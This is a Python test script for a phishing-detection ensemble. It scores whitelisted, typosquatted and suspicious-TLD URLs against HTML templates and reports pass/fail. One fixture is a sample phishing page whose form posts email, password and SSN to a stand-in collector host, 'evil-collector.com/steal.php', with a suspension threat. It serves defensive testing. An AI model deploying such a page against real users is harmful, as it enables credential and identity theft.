#test_ensemble_comprehensive.py
"""
🧪 COMPREHENSIVE ENSEMBLE TESTING
================================================================================
Tests the rule-based fusion system with real-world URLs across multiple categories
================================================================================
"""

import sys
import os
sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '../../../')))
sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '../../../Changed Solution')))

from Ensemble_Rulebased import RuleBasedFusionPredictor

# Sample HTML templates
LEGITIMATE_HTML = """
<html>
<head>
    <title>{title}</title>
    <meta name="description" content="Official website">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="icon" href="/favicon.ico">
</head>
<body>
    <h1>Welcome to {title}</h1>
    <p>This is a legitimate website.</p>
    <img src="/logo.png" alt="Logo">
    <a href="/about">About Us</a>
    <a href="/contact">Contact</a>
</body>
</html>
"""

PHISHING_HTML = """
<html>
<head>
    <title>{title} - Verify Your Account</title>
</head>
<body>
    <h1>Account Verification Required</h1>
    <p>Please verify your account to continue.</p>
    <form action="http://evil-collector.com/steal.php" method="post">
        <label>Email:</label>
        <input type="email" name="email" required>
        
        <label>Password:</label>
        <input type="password" name="password" required>
        
        <label>SSN:</label>
        <input type="text" name="ssn">
        
        <input type="hidden" name="redirect" value="phishing">
        <input type="hidden" name="victim_ip" value="">
        
        <button type="submit">Verify Account</button>
    </form>
    <p>If you don't verify within 24 hours, your account will be suspended.</p>
</body>
</html>
"""

CLEAN_PHISHING_HTML = """
<html>
<head>
    <title>{title}</title>
    <meta name="description" content="Welcome">
</head>
<body>
    <h1>Welcome</h1>
    <p>This looks like a normal page but the URL is suspicious.</p>
</body>
</html>
"""


def main():
    print("\n" + "="*80)
    print(" 🧪 COMPREHENSIVE ENSEMBLE TESTING SUITE")
    print("="*80)
    
    predictor = RuleBasedFusionPredictor()
    
    # ========================================================================
    # TEST CATEGORIES
    # ========================================================================
    
    test_suites = {
        "🟢 LEGITIMATE SITES (Whitelisted)": [
            {
                "url": "https://www.google.com",
                "html": LEGITIMATE_HTML.format(title="Google"),
                "expected_risk": "< 30%",
                "expected_level": "VERY SAFE"
            },
            {
                "url": "https://github.com",
                "html": LEGITIMATE_HTML.format(title="GitHub"),
                "expected_risk": "< 30%",
                "expected_level": "VERY SAFE"
            },
            {
                "url": "https://www.youtube.com",
                "html": LEGITIMATE_HTML.format(title="YouTube"),
                "expected_risk": "< 30%",
                "expected_level": "VERY SAFE"
            },
            {
                "url": "https://www.facebook.com",
                "html": LEGITIMATE_HTML.format(title="Facebook"),
                "expected_risk": "< 30%",
                "expected_level": "VERY SAFE"
            },
            {
                "url": "https://www.amazon.com",
                "html": LEGITIMATE_HTML.format(title="Amazon"),
                "expected_risk": "< 30%",
                "expected_level": "VERY SAFE"
            },
        ],
        
        "🟡 LEGITIMATE SITES (Non-Whitelisted)": [
            {
                "url": "https://www.bbc.com",
                "html": LEGITIMATE_HTML.format(title="BBC News"),
                "expected_risk": "< 50%",
                "expected_level": "VERY SAFE or POSSIBLY MALICIOUS"
            },
            {
                "url": "https://www.cnn.com",
                "html": LEGITIMATE_HTML.format(title="CNN"),
                "expected_risk": "< 50%",
                "expected_level": "VERY SAFE or POSSIBLY MALICIOUS"
            },
            {
                "url": "https://www.nytimes.com",
                "html": LEGITIMATE_HTML.format(title="New York Times"),
                "expected_risk": "< 50%",
                "expected_level": "VERY SAFE or POSSIBLY MALICIOUS"
            },
        ],
        
        "🔴 PHISHING - Typosquatting (Suspicious URL)": [
            {
                "url": "https://g00gle.com",
                "html": CLEAN_PHISHING_HTML.format(title="Google"),
                "expected_risk": "> 60%",
                "expected_level": "POSSIBLY MALICIOUS or VERY SUSPICIOUS"
            },
            {
                "url": "https://gith0b.com",
                "html": CLEAN_PHISHING_HTML.format(title="GitHub"),
                "expected_risk": "> 60%",
                "expected_level": "POSSIBLY MALICIOUS or VERY SUSPICIOUS"
            },
            {
                "url": "https://faceb00k.com",
                "html": CLEAN_PHISHING_HTML.format(title="Facebook"),
                "expected_risk": "> 60%",
                "expected_level": "POSSIBLY MALICIOUS or VERY SUSPICIOUS"
            },
        ],
        
        "🔴 PHISHING - Suspicious TLD": [
            {
                "url": "https://paypal-verify.tk",
                "html": CLEAN_PHISHING_HTML.format(title="PayPal"),
                "expected_risk": "> 60%",
                "expected_level": "POSSIBLY MALICIOUS or VERY SUSPICIOUS"
            },
            {
                "url": "https://bank-login.ml",
                "html": CLEAN_PHISHING_HTML.format(title="Bank Login"),
                "expected_risk": "> 60%",
                "expected_level": "POSSIBLY MALICIOUS or VERY SUSPICIOUS"
            },
            {
                "url": "https://secure-account.ga",
                "html": CLEAN_PHISHING_HTML.format(title="Secure Account"),
                "expected_risk": "> 60%",
                "expected_level": "POSSIBLY MALICIOUS or VERY SUSPICIOUS"
            },
        ],
        
        "🔴 PHISHING - Malicious Content": [
            {
                "url": "https://secure-bank-login.com",
                "html": PHISHING_HTML.format(title="Bank"),
                "expected_risk": "> 70%",
                "expected_level": "VERY SUSPICIOUS"
            },
            {
                "url": "https://verify-paypal-account.com",
                "html": PHISHING_HTML.format(title="PayPal"),
                "expected_risk": "> 70%",
                "expected_level": "VERY SUSPICIOUS"
            },
        ],
        
        "🔴 PHISHING - Combined (URL + Content)": [
            {
                "url": "https://paypal-verify.tk",
                "html": PHISHING_HTML.format(title="PayPal Verification"),
                "expected_risk": "> 85%",
                "expected_level": "VERY SUSPICIOUS"
            },
            {
                "url": "https://g00gle-login.ml",
                "html": PHISHING_HTML.format(title="Google Login"),
                "expected_risk": "> 85%",
                "expected_level": "VERY SUSPICIOUS"
            },
        ],
        
        "⚪ URL-ONLY MODE (No HTML)": [
            {
                "url": "https://www.google.com",
                "html": None,
                "expected_risk": "< 30%",
                "expected_level": "VERY SAFE"
            },
            {
                "url": "https://paypal-verify.tk",
                "html": None,
                "expected_risk": "> 60%",
                "expected_level": "POSSIBLY MALICIOUS or VERY SUSPICIOUS"
            },
        ],
    }
    
    # ========================================================================
    # RUN TESTS
    # ========================================================================
    
    total_tests = 0
    passed_tests = 0
    failed_tests = 0
    
    for category, tests in test_suites.items():
        print(f"\n{'='*80}")
        print(f" {category}")
        print(f"{'='*80}\n")
        
        for i, test in enumerate(tests, 1):
            total_tests += 1
            
            print(f"{'─'*80}")
            print(f"Test {i}: {test['url']}")
            print(f"Expected: {test['expected_risk']} - {test['expected_level']}")
            print(f"{'─'*80}")
            
            # Run prediction
            result = predictor.predict(test['url'], test['html'])
            
            # Simplified output
            print(f"\n📊 RESULT:")
            print(f"   URL Risk:      {result['url_prob']*100:.1f}%")
            print(f"   Content Risk:  {result['content_prob']*100:.1f}%")
            print(f"   Overall Risk:  {result['final_risk_pct']:.1f}%")
            print(f"   Risk Level:    {result['risk_level']}")
            print(f"   Color:         {result['color'].upper()}")
            
            # Check if passed
            risk_pct = result['final_risk_pct']
            level = result['risk_level']
            
            # Parse expected risk
            if "< 30%" in test['expected_risk']:
                risk_ok = risk_pct < 30
            elif "< 50%" in test['expected_risk']:
                risk_ok = risk_pct < 50
            elif "> 60%" in test['expected_risk']:
                risk_ok = risk_pct > 60
            elif "> 70%" in test['expected_risk']:
                risk_ok = risk_pct > 70
            elif "> 85%" in test['expected_risk']:
                risk_ok = risk_pct > 85
            else:
                risk_ok = True
            
            # Parse expected level
            if "or" in test['expected_level']:
                levels = test['expected_level'].split(" or ")
                level_ok = level in levels
            else:
                level_ok = level == test['expected_level']
            
            if risk_ok and level_ok:
                print(f"\n   ✅ PASS")
                passed_tests += 1
            else:
                print(f"\n   ❌ FAIL")
                if not risk_ok:
                    print(f"      Risk: {risk_pct:.1f}% (Expected: {test['expected_risk']})")
                if not level_ok:
                    print(f"      Level: {level} (Expected: {test['expected_level']})")
                failed_tests += 1
            
            print()
    
    # ========================================================================
    # FINAL SUMMARY
    # ========================================================================
    
    print("="*80)
    print(" 📊 FINAL TEST SUMMARY")
    print("="*80)
    print(f"\nTotal Tests:   {total_tests}")
    print(f"✅ Passed:     {passed_tests} ({passed_tests/total_tests*100:.1f}%)")
    print(f"❌ Failed:     {failed_tests} ({failed_tests/total_tests*100:.1f}%)")
    
    if passed_tests == total_tests:
        print(f"\n🎉 ALL TESTS PASSED!")
    elif passed_tests / total_tests >= 0.8:
        print(f"\n✅ GOOD - Most tests passed")
    elif passed_tests / total_tests >= 0.6:
        print(f"\n⚠️  ACCEPTABLE - Majority passed")
    else:
        print(f"\n❌ NEEDS IMPROVEMENT")
    
    print("\n" + "="*80 + "\n")


if __name__ == "__main__":
    main()